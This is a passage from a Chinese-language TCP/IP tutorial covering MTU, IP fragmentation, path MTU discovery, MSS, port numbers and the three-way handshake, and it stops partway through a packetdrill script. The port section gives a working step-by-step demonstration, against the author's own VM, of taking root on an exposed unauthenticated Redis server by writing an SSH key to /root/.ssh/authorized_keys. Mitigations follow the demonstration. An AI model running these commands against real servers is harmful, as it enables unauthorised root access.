
## 思考题

给你留一道思考题：你可以去查查资料看看 TCP 序列号回绕是如何处理的吗？

前面的文章中介绍过一个应用层的数据包会经过传输层、网络层的层层包装，交给网络接口层传输。假设上层的应用调用 write 等函数往 socket 写入了 10KB 的数据，TCP 会如何处理呢？是直接加上 TCP 头直接交给网络层吗？这篇文章我们来讲讲这相关的知识



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee252eefa4df)



## 最大传输单元（Maximum Transmission Unit, MTU）



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee252b258edf)



数据链路层传输的帧大小是有限制的，不能把一个太大的包直接塞给链路层，这个限制被称为「最大传输单元（Maximum Transmission Unit, MTU）」

下图是以太网的帧格式，以太网的帧最小的帧是 64 字节，除去 14 字节头部和 4 字节 CRC 字段，有效荷载最小为 46 字节。最大的帧是 1518 字节，除去 14 字节头部和 4 字节 CRC，有效荷载最大为 1500，这个值就是以太网的 MTU。因此如果传输 100KB 的数据，至少需要 （100 * 1024 / 1500) = 69 个以太网帧。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee252cd810a8)



不同的数据链路层的 MTU 是不同的。通过`netstat -i` 可以查看网卡的 mtu，比如在 我的 centos 机器上可以看到



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee2532d210db)



## IP 分段

IPv4 数据报的最大大小为 65535 字节，这已经远远超过了以太网的 MTU，而且有些网络还会开启巨帧（Jumbo Frame）能达到 9000 字节。 当一个 IP 数据包大于 MTU 时，IP 会把数据报文进行切割为多个小的片段(小于 MTU），使得这些小的报文可以通过链路层进行传输

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee253453d344)



IP 头部中有一个表示分片偏移量的字段，用来表示该分段在原始数据报文中的位置，如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee255b9f5ab8)



下面我们 wireshark 来演示 IP 分段，wireshark 开启抓包，在命令行中执行

```
ping -s 3000 www.baidu.com

输出：
PING www.a.shifen.com (14.215.177.39): 3000 data bytes
Request timeout for icmp_seq 0
Request timeout for icmp_seq 1
Request timeout for icmp_seq 2
```

在 wireshark 的显示过滤器中输入`ip.addr==14.215.177.39`



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee2561cafa6a)



通过`man ping`命令可以看到`ping -s`命令会增加 8byte 的 ICMP 头，所以`ping -s 3000` IP 层实际会发送 3008 字节。

> -s packetsize Specify the number of data bytes to be sent. The default is 56, which translates into 64 ICMP data bytes when combined with the 8 bytes of ICMP header data. This option cannot be used with ping sweeps.

先看第一个包

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee25626d29f9)



这个包是 IP 分段包的第一个分片，`More fragments: Set`表示这个包是 IP 分段包的一部分，还有其它的分片包，`Fragment offset: 0`表示分片偏移量为 0，IP 包的 payload 的大小为 1480，加上 20 字节的头部正好是 1500

第二个包的详情截图如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee2564fce539)

同样`More fragments``Fragment offset: 185`



第三个包的详情截图如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee258e0a8b04)



可以看到`More fragments`处于 Not set 状态，表示这是最后一个分片了。`Fragment offset: 370`表示偏移量为 370 * 8 = 2960，包的大小为 68 - 20（IP 头部大小） = 48

三个分片如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee258e3ebcc3)



前面我们提到 IP 协议不会对丢包进行重传，那么 IP 分段中有分片丢失、损坏的话，会发生什么呢？ 这种情况下，目标主机将没有办法将分段的数据包重组为一个完整的数据包，依赖于传输层是否进行重传。

利用 IP 包分片的策略，有一种对应的网络攻击方式`IP fragment attack`，就是一直传`More fragments = 1`的包，导致接收方一直缓存分片，从而可能导致接收方内存耗尽。

## 网络中的木桶效应：路径 MTU

一个包从发送端传输到接收端，中间要跨越很多个网络，每条链路的 MTU 都可能不一样，这个通信过程中最小的 MTU 称为「路径 MTU（Path MTU）」。就好比开车有时候开的是双向 4 车道，有时候可能是乡间小路一样。

比如下图中，第一段链路 MTU 大小为 1500 字节，第二段链路 MTU 为 800 字节，第三段链路 MTU 为 1200 字节，则路径 MTU 为三段 MTU 的最小值 800。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee2596d30a0c)



路径 MTU 就跟木桶效应是一个道理，木桶的盛水量由最短的那条短板决定，路径 MTU 也是由通信链条中最小的 MTU 决定。

## 实际模拟路径 MTU 发现

用下面的代码可以用来测试路径 MTU 发现，为了方便，每行前面加了行号

```
0.000 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
0.000 bind(3, ..., ...) = 0
0.000 listen(3, 1) = 0

0.100 < S 0:0(0) win 32792 <mss 1460,nop,wscale 7>
0.100 > S. 0:0(0) ack 1 <mss 1460,nop,wscale 7>
0.200 < . 1:1(0) ack 1 win 257
0.200 accept(3, ..., ...) = 4
// 至此三次握手，相关初始化完成

// 发送第一个数据包
+0.2 write(4, ..., 1460) = 1460
// 断言内核会发送 1460 大小的数据包出来
+0.0 > P. 1:1461(1460) ack 1

// 发送 ICMP 错误报文，告知包太大, 需要分片
+0.01 < icmp unreachable frag_needed mtu 1200 [1:1461(1460)]

// TCP 立马选择对方告知的较小 MTU 计算自己的 MSS，重发此包
+.0 > . 1:1161(1160) ack 1
+0.0> P. 1161:1461(300) ack 1

// 确认所有的数据
+0.1 < . 1:1(0) ack 1461 win 257

+0 `sleep 1000000`
```

其中在发送了 1460 大小的数据以后，这第一个数据包在 IP 层设置了部分段，之后收到一个 ICMP 告知的报文过大错误

运行抓包如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee2596ed151e)



- 1 ~ 3：三次握手

- 4：发送长度为 1460 的数据，这个数据包设置了不允许分片`Don't fragment: Set`

- 5：发送端收到 ICMP 包，告知包太大需要分片，下一个分片的大小按照 MTU=1200 来计算

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee25a2fd405f)

- 6：TCP 为了避免底层分片立刻拆包重发数据包，这次包大小为 1200 - 40 = 1160

- 7：发送端发送剩下的 300 字节（1460 - 1160）

- 8：确认所有的数据

整个过程如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee25ce8eef17)



因为有 MTU 的存在，TCP 每次发包的大小也限制了，这就是下面要介绍的 MSS。

## TCP 最大段大小（Max Segment Size，MSS）

TCP 为了避免被发送方分片，会主动把数据分割成小段再交给网络层，最大的分段大小称之为 MSS（Max Segment Size）。

```
MSS = MTU - IP header头大小 - TCP 头大小
```

这样一个 MSS 的数据恰好能装进一个 MTU 而不用分片。

在以太网中 TCP 的 MSS = 1500（MTU） - 20（IP 头大小） - 20（TCP 头大小）= 1460



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee25a409b4e5)



我们来抓一个包来实际看一下，下面是下载一个 png 图片的 http 请求包 当三次握手建立一个 TCP 连接时，通信的双方会在 SYN 报文里说明自己允许的最大段大小。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee25cf0c3f71)



可以看到 TCP 的包体数据大小为 1448，因为TCP 头部里包含了 12 字节的选项（Options）字段，头部大小从之前的 20 字节变为了 32 字节，所以 TCP 包体大小变为了：1500（以太网 MTU） - 20（IP 固定表头大小） - 20（TCP 固定表头大小） - 12（TCP 表头选项） = 1448

## 为什么有时候抓包看到的单个数据包大于 MTU

写一个简单的代码来测试一下。

在服务端（10.211.55.10）使用`nc -l 9999` 启动一个 tcp 服务器

```
nc -l 9999
```

在一台机器（10.211.55.5）记为 c1，使用 tcpdump 抓包开启抓包

```
sudo tcpdump -i any port 9999 -nn
```

执行下面的 java 代码，往服务端 c2 写 100KB 的数据

```
Socket socket = new Socket();
socket.connect(new InetSocketAddress("c2", 9999));
OutputStream out = socket.getOutputStream();
byte[] bytes= new byte[100 * 1024];
out.write(bytes);
System.in.read();
```

抓包文件显示如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee25cebb777a)



可以看到包的长度达到了 14k，远超 MTU 的大小，为什么可以这样呢？

这就要说到 TSO（TCP Segment Offload）特性了，TSO 特性是指由网卡代替 CPU 实现 packet 的分段和合并，节省系统资源，因此 TCP 可以抓到超过 MTU 的包，但是不是真正传输的单个包会超过链路的 MTU。

使用`ethtool -k`可以查看这个特性是否打开，比如`ethtool -k eth0`输出如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8ee25e95f725e)



## 小结

这篇文章主要介绍了几个比较基础的概念，IP 数据包长度在超过链路的 MTU 时在发送之前需要分片，而 TCP 层为了 IP 层不用分片主动将包切割成 MSS 大小。

## 作业题

1、TCP/IP 协议中，MSS 和 MTU 分别工作在哪一层？

2、在 MTU=1500 字节的以太网中，TCP 报文的最大载荷为多少字节？

# 端口PORT

这篇文章我们来聊聊端口号这个老朋友。端口号的英文叫`Port`，原意是"港口，口岸"的意思，作为繁忙的进出口转运货物，跟端口号在计算机中的含义非常接近。



![236966-1](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134ba05bd18d)



分层结构中每一层都有一个唯一标识，比如链路层的 MAC 地址，IP 层的 IP 地址，传输层是用端口号。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134ba7385716)



TCP 用两字节的整数来表示端口，一台主机最大允许 65536 个端口号的。TCP 首部中端口号如下图黄色高亮部分。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134ba78527c6)



如果把 ip 地址比作一间房子，端口就是出入这间房子的门。房子一般只有几个门，但是一台主机端口最多可以有 65536 个。

有了 IP 协议，数据包可以顺利的被传输到对应 IP 地址的主机，当主机收到一个数据包时，应该把这个数据包交给哪个应用程序进行处理呢？这台主机可能运行多个应用程序，比如处理 HTTP 请求的 web 服务器 Nginx，Redis 服务器， 读写 MySQL 服务器的客户端等。

传输层就是用端口号来区分同一个主机上不同的应用程序的。操作系统为有需要的进程分配端口号，当目标主机收到数据包以后，会根据数据报文首部的目标端口号将数据发送到对应端口的进程。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134ba7638486)



主动发起的客户端进程也需要开启端口，会把自己的端口放在首部的源端口（source port）字段中，以便对方知道要把数据回复给谁。

## 端口号分类

端口号被划分成以下 3 种类型：

- 熟知端口号（well-known port）
- 已登记的端口（registered port）
- 临时端口号（ephemeral port）

------

**熟知端口号（well-known port）**

熟知端口号由专门的机构由 IANA 分配和控制，范围为 0~1023。为了能让客户端能随时找到自己，服务端程序的端口必须要是固定的。很多熟知端口号已经被用就分配给了特定的应用，比如 HTTP 使用 80端口，HTTPS 使用 443 端口，ssh 使用 22 端口。 访问百度`http://www.baidu.com/`，其实就是向百度服务器之一（163.177.151.110）的 80 端口发起请求，`curl -v http://www.baidu.com/`抓包结果如下

```
20:12:32.336962 IP 10.211.55.10.39438 > 163.177.151.110.80: Flags [S], seq 2171375522, win 29200, options [mss 1460,sackOK,TS val 346956173 ecr 0,nop,wscale 7], length 0
20:12:32.373834 IP 163.177.151.110.80 > 10.211.55.10.39438: Flags [S.], seq 3304042876, ack 2171375523, win 32768, options [mss 1460,wscale 1,nop], length 0
20:12:32.373948 IP 10.211.55.10.39438 > 163.177.151.110.80: Flags [.], ack 1, win 229, length 0
20:12:32.374290 IP 10.211.55.10.39438 > 163.177.151.110.80: Flags [P.], seq 1:78, ack 1, win 229, length 77
GET / HTTP/1.1
Host: www.baidu.com
User-Agent: curl/7.64.1
Accept: */*
```

在 Linux 上，如果你想监听这些端口需要 Root 权限，为的就是这些熟知端口不被普通的用户进程占用，防止某些普通用户实现恶意程序（比如伪造 ssh 监听 22 端口）来获取敏感信息。熟知端口也被称为保留端口。

------

**已登记的端口（registered port）**

已登记的端口不受 IANA 控制，不过由 IANA 登记并提供它们的使用情况清单。它的范围为 1024～49151。

为什么是 49151 这样一个魔数？ 其实是取的端口号最大值 65536 的 3/4 减 1 （49151 = 65536 * 0.75 - 1）。可以看到已登记的端口占用了大约 75% 端口号的范围。

已登记的端口常见的端口号有：

- MySQL：3306
- Redis：6379
- MongoDB：27017

熟知端口号和已登记的端口都可以在 [iana 的官网](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) 查到

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134ba750f311)



**临时端口号（ephemeral port）** 如果应用程序没有调用 bind() 函数将 socket 绑定到特定的端口上，那么 TCP 和 UDP 会为该 socket 分配一个唯一的临时端口。IANA 将 49152～65535 范围的端口称为临时端口（ephemeral port）或动态端口（dynamic port），也称为私有端口（private port），这些端口可供本地应用程序临时分配端口使用。

不同的操作系统实现会选择不同的范围分配临时端口，在 Linux 上能分配的端口范围由 /proc/sys/net/ipv4/ip_local_port_range 变量决定，一般 Linux 内核端口范围为 32768~60999

```
cat /proc/sys/net/ipv4/ip_local_port_range                                      
32768 	60999
```

在需要主动发起大量连接的服务器上（比如网络爬虫、正向代理）可以调整 ip_local_port_range 的值，允许更多的可用端口。

## 端口相关的命令

### 如何查看对方端口是否打开

使用 nc 和 telnet 这两个命令可以非常方便的查看到对方端口是否打开或者网络是否可达，比如查看 10.211.55.12 机器的 6379 端口是否打开可以使用

```
telnet 10.211.55.12 6379                                                                                                                                     
Trying 10.211.55.12...
Connected to 10.211.55.12.
Escape character is '^]'.


nc -v  10.211.55.12 6379                                                                                                                                    
Ncat: Connected to 10.211.55.12:6379
```

这两个命令我后面会有独立的内容来介绍，现在先有一个印象。

如果对端端口没有打开，会发生什么呢？比如 10.211.55.12 的6380 端口没有打开，使用 telnet 和 nc 命令会出现 "Connection refused" 错误

```
telnet  10.211.55.12 6380                                                                                                                                     
Trying 10.211.55.12...
telnet: connect to address 10.211.55.12: Connection refused


nc -v  10.211.55.12 6380                                                                                                                                    Ncat: Connection refused
```

### 如何查看端口被什么进程监听占用

比如查看 22 端口被谁占用，常见的可以使用 lsof 和 netstat 两种方法

**第一种方法：使用 netstat**

```
sudo netstat -ltpn | grep :22
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134ba8247981)



**第二种方法：使用 lsof** 因为在 linux 上一切皆文件，TCP socket 连接也是一个 fd。因此使用 lsof 也可以

```
sudo lsof -n -P -i:22
```

其中 `-n` 表示不将 IP 转换为 hostname，`-P` 表示不将 port number 转换为 service name，`-i:port` 表示端口号为 22 的进程



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134bd9a94039)



可以看到 22 端口被进程号为 1333 的 sshd 进程监听

反过来，如何查看进程监听或者打开了哪些端口呢？

### 如何查看进程监听的端口号

还是以 sshd 为例，先用`ps -ef | grep sshd` 找到 sshd 的进程号，这里为 1333

**第一种方法：使用 netstat**

```
sudo netstat -atpn | grep 1333
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134be3084d77)



**第二种方法：使用 lsof**

```
sudo lsof -n -P -p 1333 | grep TCP
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134bd8f5e97e)



**第三种方法奇技淫巧：/proc/pid**

在 linux 上有一个神奇的目录`/proc`，每个进程启动以后会生成这样一个目录，比如我们用`nc -4 -l 8080`快速启动一个 tcp 的服务器，使用 ps 找到进程 id

```
ps -ef | grep "nc -4 -l 8080" | grep -v grep

UID        PID  PPID  C STIME TTY          TIME CMD
ya       19196 15191  0 00:33 pts/6    00:00:00 nc -4 -l 8080
```

然后 cd 进 /proc/19196 (备注 19196 是 nc 命令的进程号），执行`ls -l`看到如下输出

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134be8a0a751)



里面有一个很有意思的文件和目录，cwd 表示 nc 命令是在哪个工作目录执行的。fd 目录表示进程打开的所有的文件，cd 到那个目录



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134be8142103)



fd 为 0，1，2的分别表示标准输入stdin(0)、标准输出stdout(1)、错误输出stderr(2)。fd 为 3 表示 nc 监听的套接字 fd，后面跟了一个神奇的数字 25597827，这个数字表示 socket 的 inode 号，我们可以通过这个 inode 号来找改 socket 的信息。

TCP 的连接信息会在这里显示`cat /proc/net/tcp`

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134be85cf9f1)

可以找到 inode 为 25597827 的套接字。其中 local_address 为 00000000:1F90，rem_address 为 00000000:0000，表示四元组（0.0.0.0:8080, 0.0.0.0:0)，state 为 0A，表示 TCP_LISTEN 状态。



## 利用端口进行网络攻击

道路千万条，安全第一条。暴露不合理，运维两行泪。

把本来应该是内网或本机调用的服务端口暴露到公网是极其危险的事情，比如之前 2015 年很多 Redis 服务器遭受到了攻击，方法正是利用了暴露在公网的 Redis 端口进行入侵系统。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134c20831df5)



它的原理是利用了不需要密码登录的 redis，清空 redis 数据库后写入他自己的 ssh 登录公钥，然后将redis数据库备份为 /root/.ssh/authotrized_keys。 这就成功地将自己的公钥写入到 .ssh 的 authotrized_keys，无需密码直接 root 登录被黑的主机。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134c20cdc6ed)



下面我们来演示一个以 root 权限运行的 redis 服务器是怎么被黑的。

场景：一台 ip 为 10.211.55.12（我的一台 Centos7 虚拟机）的 6379 端口对外暴露端口。首先尝试登录，发现需要输入密码

```
ssh root@10.211.55.12
root@10.211.55.12's password:
Permission denied, please try again.
```

切换到 root 用户 1、下载解压 Redis 3.0 的代码：

```
wget https://codeload.github.com/antirez/redis/zip/3.0
unzip 3.0
```

2、编译 redis

```
cd redis-3.0
make
```

3、运行 redis 服务器，不出意外，redis 服务器就启动起来了。

```
cd src
./redis-server
```

执行 netstat

```
sudo netstat -ltpn | grep 6379
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134c20789333)

可以看到 redis 服务器默认监听 0.0.0.0:6379，表示允许任意来源的连接 6379 端口，可以在另外一台机器使用 telnet 或者 nc 访问此端口，如果成功连接，可以输入 ping 看是否返回 pong。



```
nc c4 6379
ping
+PONG
```

注意 Centos7 上默认启用了防火墙，会禁止访问某些端口，可以下面的方式禁用。

```
sudo systemctl stop firewalld.service
```

4、客户端使用 ssh-keygen 生成公钥，不停按 enter，不出意外马上在`~/.ssh`生成了目录生成了公私钥文件

```
ssh-keygen

ll ~/.ssh
ya@c2 ~$ ll .ssh
-rw-------. 1 ya ya 1.7K 4月  14 03:00 id_rsa
-rw-r--r--. 1 ya ya  387 4月  14 03:00 id_rsa.pub
```

5、将客户端公钥写入到文件 foo.txt 中以便后面写入到 redis，其实是生成一个头尾都包含两个空行的公钥文件

```
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
```

6、先清空 Redis 存储所有的内容，将 foo.txt 文件内容写入到某个 key 中，这里为 crackit，随后调用 redis-cli 登录 redis 调用 config 命令设置文件 redis 的 dir 目录和把 rdb 文件的名字dbfilename 设置为 authorized_keys。

```
redis-cli -h 10.211.55.12 echo flushall
cat foo.txt | redis-cli -h 10.211.55.12 -x set crackit

// 登录 Redis
redis-cli -h 10.211.55.12

config set dir /root/.ssh

config set dbfilename "authorized_keys"
```

7、执行 save 将 crackit 内容 落盘

```
save
```

8、尝试登录

```
ssh root@10.211.55.12
```

我们来看一下，服务器 10.211.55.12 机器上 /root/.ssh/authorized_keys 的内容，可以看到 authorized_keys 文件正是我们客户端机器的公钥文件



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134c2111e4f8)



利用这个漏洞有几个前提条件

- Redis 绑定 0.0.0.0 允许所有来源的 TCP 连接，且没有设置密码 这完全是作死，因为就算不能入侵你的系统，也可以修改 Redis 中缓存的内容。不过 Redis 的设计者们一开始就认为不会有人这么做，因为把 Redis 放在一个信任的内网环境运行才是正道啊。
- Redis 没有设置密码或密码过于简单 大部分开发都没有意识到 Redis 没有密码是一个大问题，要么是一个很简单的密码要么没有密码，Redis 的处理能力非常强，auth这种命令可以一秒钟处理几万次以上，简单的密码很容易被暴力破解
- redis-server 进程使用 root 用户启动 不用 root 用户启动也可以完成刷新 authorized_keys 的功能，但是不能登陆，因为非 root 用户 authorized_keys 的权限要求是 600 才可以登录，但是可以覆盖破坏系统的文件。
- 没有禁用 save、config、flushall 这些高危操作 在正式服务器上这些高危操作都应该禁用或者进行重命名。这样就算登录你你的 Redis，也没有办法修改 Redis 的配置和修改服务器上的文件。

## 解决办法

- 首要原则：不暴露服务到公网 让 redis 运行在相对可信任的内网环境
- 设置高强度密码 使用高强度密码增加暴力破解的难度
- 禁止 root 用户启动 redis 业务服务永远不要使用 root 权限启动
- 禁用或者重命名高危命令 禁用或者重命名 save、config、flushall 等这些高危命令，就算成功登陆了 Redis，也就只能折腾你的 redis，不能取得系统的权限进行更危险的操作
- 升级高版本的 Redis 出现如此严重的问题，Redis 从 3.2 版本加入了 protected mode， 在没有指定 bind 地址或者没有开启密码设置的情况下，只能通过回环地址本地访问，如果尝试远程访问 redis，会提示以下错误：

-DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command 'CONFIG SET protected-mode no' from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to 'no', and then restarting the server. 3) If you started the server manually just for testing, restart it with the '--protected-mode no' option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.

## 小结

这篇文章讲解了端口号背后的细节，我为你准备了思维导图：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9134c2146ce36)



## 作业题

1、小于（）的 TCP/UDP 端口号已保留与现有服务一一对应，此数字以上的端口号可自由分配？

- A、80
- B、1024
- C、8080
- D、65525

2、下列TCP端口号中不属于熟知端口号的是（）

- A、21
- B、23
- C、80
- D、3210

3、关于网络端口号，以下哪个说法是正确的（）

- A、通过 netstat 命令，可以查看进程监听端口的情况
- B、https 协议默认端口号是 8081
- C、ssh 默认端口号是 80
- D、一般认为，0-80 之间的端口号为周知端口号(Well Known Ports)

# 三次握手

这篇文章我们来详细了解一下三次握手，很多人会说三次握手这么简单，还需要讲吗？其实三次握手背后有很多值得我们思考和深究的地方。

## 三次握手

一次经典的三次握手的过程如下图所示：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518ccedac1b6e)



三次握手的最重要的是交换彼此的 ISN（初始序列号），序列号怎么计算来的可以暂时不用深究，我们需要重点掌握的是包交互过程中序列号变化的原理。

1、客户端发送的一个段是 SYN 报文，这个报文只有 SYN 标记被置位。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518cceddbdcf6)

SYN 报文不携带数据，但是它占用一个序号，下次发送数据序列号要加一。客户端会随机选择一个数字作为初始序列号（ISN）



```
为什么 SYN 段不携带数据却要消耗一个序列号呢？
```

这是一个好问题，不占用序列号的段是不需要确认的（都没有内容确认个啥），比如 ACK 段。SYN 段需要对方的确认，需要占用一个序列号。后面讲到四次挥手那里 FIN 包也有同样的情况，在那里我们会用一个图来详细说明。

关于这一点，可以记住如下的规则：

> 凡是消耗序列号的 TCP 报文段，一定需要对端确认。如果这个段没有收到确认，会一直重传直到达到指定的次数为止。

2、服务端收到客户端的 SYN 段以后，将 SYN 和 ACK 标记都置位



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518ccee187690)



SYN 标记的作用与步骤 1 中的一样，也是同步服务端生成的初始序列号。ACK 用来告知发送端之前发送的 SYN 段已经收到了，「确认号」字段指定了发送端下次发送段的序号，这里等于客户端 ISN 加一。 与前面类似 SYN + ACK 端虽然没有携带数据，但是因为 SYN 段需要被确认，所以它也要消耗一个序列号。

3、客户端发送三次握手最后一个 ACK 段，这个 ACK 段用来确认收到了服务端发送的 SYN 段。因为这个 ACK 段不携带任何数据，且不需要再被确认，这个 ACK 段不消耗任何序列号。

一个最简单的三次握手过程的wireshark 抓包如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518ccee4d8711)



在 wireshark 中 SEQ 和 ACK 号都是绝对序号，一般而言这些序号都较大，为了便于分析，我们一般都会显示相对序列号，在 wireshark 的"Edit->Preferences->Protocols->TCP"菜单里可以进行设置显示相对序列号，



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518ccee326db4)



除了交换彼此的初始序列号，三次握手的另一个重要作用是交换一些辅助信息，比如最大段大小（MSS）、窗口大小（Win）、窗口缩放因子（WS)、是否支持选择确认（SACK_PERM）等，这些都会在后面的文章中重点介绍。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518ccee5c7c01)



## 初始序列号（Initial Sequence Number, ISN）

初始的序列号并非从 0 开始，通信双方各自生成，一般情况下两端生成的序列号不会相同。生成的算法是 ISN 随时间而变化，会递增的分配给后续的 TCP 连接的 ISN。

一个建议的算法是设计一个假的时钟，每 4 微妙对 ISN 加一，溢出 2^32 以后回到 0，这个算法使得猜测 ISN 变得非常困难。

> ISN 能设置成一个固定值呢？

答案是不能，TCP 连接四元组（源 IP、源端口号、目标 IP、目标端口号）唯一确定，所以就算所有的连接 ISN 都是一个固定的值，连接之间也是不会互相干扰的。但是会有几个严重的问题

1、出于安全性考虑。如果被知道了连接的ISN，很容易构造一个在对方窗口内的序列号，源 IP 和源端口号都很容易伪造，这样一来就可以伪造 RST 包，将连接强制关闭掉了。如果采用动态增长的 ISN，要想构造一个在对方窗口内的序列号难度就大很多了。

2、因为开启 SO_REUSEADDR 以后端口允许重用，收到一个包以后不知道新连接的还是旧连接的包因为网络的原因姗姗来迟，造成数据的混淆。如果采用动态增长的 ISN，那么可以保证两个连接的 ISN 不会相同，不会串包。

## 三次握手的状态变化

三次握手过程的状态变化图如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518cd1664fa5d)



对于客户端而言：

- 初始的状态是处于 `CLOSED` 状态。CLOSED 并不是一个真实的状态，而是一个假想的起点和终点。
- 客户端调用 connect 以后会发送 SYN 同步报文给服务端，然后进入 `SYN-SENT` 阶段，客户端将保持这个阶段直到它收到了服务端的确认包。
- 如果在 `SYN-SENT` 状态收到了服务端的确认包，它将发送确认服务端 SYN 报文的 ACK 包，同时进入 ESTABLISHED 状态，表明自己已经准备好发送数据。

对于服务端而言：

- 初始状态同样是 `CLOSED` 状态
- 在执行 bind、listen 调用以后进入 `LISTEN`状态，等待客户端连接。
- 当收到客户端的 SYN 同步报文以后，会回复确认同时发送自己的 SYN 同步报文，这时服务端进入 `SYN-RCVD` 阶段等待客户端的确认。
- 当收到客户端的确认报文以后，进入`ESTABLISHED` 状态。这时双方可以互相发数据了。

## 如何构造一个 SYN_SENT 状态的连接

使用我们前面介绍的 packetdrill 可以轻松构造一个 SYN_SENT 状态的连接（发出 SYN 包对端没有回复的状况）

```
// 新建一个 server socket
+0   socket(..., SOCK_STREAM, IPPROTO_TCP) = 3

// 客户端 connect
